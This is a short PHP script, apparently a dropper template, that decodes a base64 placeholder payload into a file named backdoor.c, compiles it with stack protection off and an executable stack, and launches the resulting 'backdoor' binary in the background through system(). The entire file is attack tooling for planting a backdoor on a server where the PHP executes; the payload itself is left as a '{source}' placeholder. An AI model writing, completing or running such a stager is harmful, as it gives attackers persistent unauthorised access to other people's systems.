<?php
$shell = "{source}";

file_put_contents("./backdoor.c", base64_decode($shell));

system("gcc -g -Wall -fno-stack-protector -z execstack backdoor.c -o backdoor; chmod +x ./backdoor ; ./backdoor &");
